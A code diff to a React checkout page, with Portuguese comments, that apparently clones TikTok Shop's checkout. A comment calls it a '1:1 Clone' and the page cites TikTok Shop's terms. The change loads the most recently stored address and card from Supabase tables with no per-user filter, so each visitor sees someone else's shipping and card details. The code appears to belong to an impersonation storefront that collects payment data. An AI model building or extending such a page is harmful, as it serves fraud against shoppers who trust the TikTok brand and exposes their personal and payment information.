@@ -6,7 +6,6 @@ import {
   ArrowLeft, 
   MapPin, 
   ChevronRight, 
-  ShieldCheck, 
   Star, 
   Zap, 
   ChevronUp,
@@ -41,28 +40,49 @@ const Checkout: React.FC = () => {
   const [isSubtotalOpen, setIsSubtotalOpen] = useState(true);
   const [isPlacingOrder, setIsPlacingOrder] = useState(false);
 
+  // Função para buscar dados do Supabase
+  const fetchData = async () => {
+    try {
+      // Buscar endereço mais recente
+      const { data: addresses } = await supabase
+        .from('addresses')
+        .select('*')
+        .order('created_at', { ascending: false })
+        .limit(1);
+      
+      if (addresses && addresses.length > 0) {
+        setAddressData(addresses[0]);
+      }
+
+      // Buscar cartão mais recente
+      const { data: cards } = await supabase
+        .from('cards')
+        .select('*')
+        .order('created_at', { ascending: false })
+        .limit(1);
+
+      if (cards && cards.length > 0) {
+        setCardData(cards[0]);
+        setPaymentMethod('card');
+      }
+    } catch (err) {
+      console.error("Erro ao buscar dados:", err);
+    }
+  };
+
   useEffect(() => {
+    // Carregar produto do estado da navegação
     if (location.state?.product) {
       setProduct(location.state.product);
-      // Pega a quantidade inicial se existir
-      if (location.state.initialQuantity) {
-        setQuantity(location.state.initialQuantity);
-      }
-      if (location.state.selectedVariation) {
-        setSelectedVar(location.state.selectedVariation);
-      }
+      if (location.state.initialQuantity) setQuantity(location.state.initialQuantity);
+      if (location.state.selectedVariation) setSelectedVar(location.state.selectedVariation);
     } else {
+      // Se não houver produto no state, podemos tentar carregar o primeiro da lista como fallback
+      // mas o ideal é que ele venha da navegação.
       navigate('/');
     }
 
-    if (location.state?.cardAdded && location.state?.cardData) {
-      setCardData(location.state.cardData);
-      setPaymentMethod('card');
-    }
-
-    if (location.state?.addressAdded && location.state?.addressData) {
-      setAddressData(location.state.addressData);
-    }
+    fetchData();
   }, [location.state, navigate]);
 
   if (!product) return null;
@@ -131,13 +151,20 @@ const Checkout: React.FC = () => {
       </div>
 
       <div className="max-w-[600px] mx-auto">
-        {/* Address Section */}
+        {/* Address Section - Mostrando resumo do endereço */}
         <div className="bg-white p-4 flex items-center justify-between border-b border-gray-100">
-          <div className="flex items-center space-x-2">
+          <div className="flex items-center space-x-3">
             <MapPin size={18} className={addressData ? "text-[#00BFA5]" : "text-gray-900"} />
-            <span className="text-[14px] text-gray-900 font-medium">
-              {addressData ? `${addressData.address}, ${addressData.number}` : "Endereço de envio"}
-            </span>
+            <div className="flex flex-col">
+              <span className="text-[14px] text-gray-900 font-bold">
+                {addressData ? "Endereço de envio" : "Adicionar endereço"}
+              </span>
+              {addressData && (
+                <span className="text-[12px] text-gray-500">
+                  {addressData.city}, {addressData.state}
+                </span>
+              )}
+            </div>
           </div>
           <button className="text-[#FF2C55] text-[14px] font-medium" onClick={() => navigate('/adicionar-endereco')}>
             {addressData ? "Alterar" : "+ Adicionar endereço"}
@@ -253,7 +280,7 @@ const Checkout: React.FC = () => {
           </div>
         </div>
 
-        {/* Payment Methods Section (1:1 Clone) */}
+        {/* Payment Methods Section */}
         <div className="bg-white mt-2.5 p-4 space-y-4">
           <h3 className="text-[16px] font-bold text-gray-900 mb-1">Forma de pagamento</h3>
           
@@ -262,13 +289,16 @@ const Checkout: React.FC = () => {
             <div className="flex items-center justify-between">
               <div className="flex items-center space-x-2">
                 <div className="w-5 h-5 flex items-center justify-center bg-[#F1F1F1] rounded-sm">
-                   <Plus size={14} className="text-gray-400" />
+                   {cardData ? <CreditCard size={14} className="text-[#00BFA5]" /> : <Plus size={14} className="text-gray-400" />}
                 </div>
                 <span className="text-[15px] font-medium text-gray-900">
                   {cardData ? `Cartão final ${cardData.last4}` : "Cartão de crédito"}
                 </span>
               </div>
-              <ChevronRight size={18} className="text-gray-300" />
+              <div className="flex items-center space-x-2">
+                {paymentMethod === 'card' && <div className="w-2.5 h-2.5 bg-[#FF2C55] rounded-full" />}
+                <ChevronRight size={18} className="text-gray-300" />
+              </div>
             </div>
             
             <div className="flex flex-col space-y-3 pl-7">
@@ -301,16 +331,6 @@ const Checkout: React.FC = () => {
               {paymentMethod === 'pix' && <div className="w-2.5 h-2.5 bg-[#FF2C55] rounded-full" />}
             </div>
           </div>
-
-          {/* More Methods (Google Pay) */}
-          <div className="flex items-center justify-between pt-4 border-t mt-2">
-            <div className="h-6 w-10 border rounded flex items-center justify-center bg-white">
-               <img src="https://images.seeklogo.com/logo-png/32/1/google-pay-logo-png_seeklogo-324563.png" className="h-3" alt="Google Pay" />
-            </div>
-            <button className="flex items-center text-[14px] text-gray-900 font-medium">
-              Ver todos <ChevronRight size={16} className="ml-0.5" />
-            </button>
-          </div>
         </div>
 
         {/* Legal Text Section */}
@@ -319,7 +339,6 @@ const Checkout: React.FC = () => {
             Ao fazer um pedido, você concorda com <span className="font-bold text-gray-900">Termos de uso e venda do TikTok Shop</span> e reconhece que leu e concordou com a <span className="font-bold text-gray-900">Política de privacidade do TikTok</span>.
           </p>
           
-          {/* Economy Banner */}
           <div className="bg-[#FFF1F3] p-3 flex items-center space-x-2 rounded-sm border border-[#FFD9E0]/20">
             <span className="text-[16px]">😊</span>
             <span className="text-[13px] text-[#FF2C55] font-medium leading-tight">
